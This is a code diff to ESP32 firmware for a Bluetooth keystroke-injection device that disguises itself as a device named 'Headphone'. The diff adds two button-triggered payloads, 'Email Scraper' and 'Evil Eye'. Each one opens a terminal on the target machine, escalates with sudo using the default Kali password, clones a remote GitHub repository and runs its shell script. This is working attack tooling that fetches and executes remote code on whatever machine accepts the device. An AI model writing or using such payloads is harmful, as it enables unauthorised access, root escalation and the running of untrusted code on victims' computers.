@@ -11,6 +11,8 @@
 #define BUTTON_9_PIN 27 // Button 9 (Trigger: CanaryTokensDetector)
 #define BUTTON_10_PIN 26 // Button 10 (Trigger: Seeker)
 #define BUTTON_11_PIN 32 // Button 11 (Trigger: File Encryption)
+#define BUTTON_12_PIN 33 // Button 12 (Trigger: Email Scraper)
+#define BUTTON_13_PIN 14 // Button 13 (Trigger: Evil Eye)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -26,6 +28,8 @@ bool lastState8 = HIGH;
 bool lastState9 = HIGH;
 bool lastState10 = HIGH;
 bool lastState11 = HIGH;
+bool lastState12 = HIGH;
+bool lastState13 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -44,7 +48,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 11 Triggers on Buttons 1-11 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27, 26, 32)...");
+  Serial.println("Starting BLE HID setup with 13 Triggers on Buttons 1-13 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27, 26, 32, 33, 14)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -57,6 +61,8 @@ void setup() {
   pinMode(BUTTON_9_PIN, INPUT_PULLUP);
   pinMode(BUTTON_10_PIN, INPUT_PULLUP);
   pinMode(BUTTON_11_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -77,6 +83,8 @@ void loop() {
     bool state9 = digitalRead(BUTTON_9_PIN);
     bool state10 = digitalRead(BUTTON_10_PIN);
     bool state11 = digitalRead(BUTTON_11_PIN);
+    bool state12 = digitalRead(BUTTON_12_PIN);
+    bool state13 = digitalRead(BUTTON_13_PIN);
 
     // Button 1: Password Manager (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -319,6 +327,70 @@ void loop() {
       Serial.println("File Encryption Payload executed");
     }
 
+    // Button 12: Email Scraper (Pin 33)
+    if (lastState12 == HIGH && state12 == LOW) {
+      Serial.println("Button 12: Email Scraper (Pin 33)");
+      bleKeyboard.press(KEY_LEFT_CTRL); 
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('t'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(5000);
+      sendString("cd Desktop", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("sudo su", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("kali", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd Email-Scraper", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("chmod +x *", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("bash emailscraper.sh", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Email Scraper Payload executed");
+    }
+
+    // Button 13: Evil Eye (Pin 14)
+    if (lastState13 == HIGH && state13 == LOW) {
+      Serial.println("Button 13: Evil Eye (Pin 14)");
+      bleKeyboard.press(KEY_LEFT_CTRL); 
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('t'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(5000);
+      sendString("cd Desktop", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("sudo su", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("kali", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("git clone https://github.com/codewithharit/Evil-Eye.git", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd Evil-Eye", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("chmod +x *", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("bash linux.sh", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Evil Eye Payload executed");
+    }
+
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -330,6 +402,8 @@ void loop() {
     lastState9 = state9;
     lastState10 = state10;
     lastState11 = state11;
+    lastState12 = state12;
+    lastState13 = state13;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
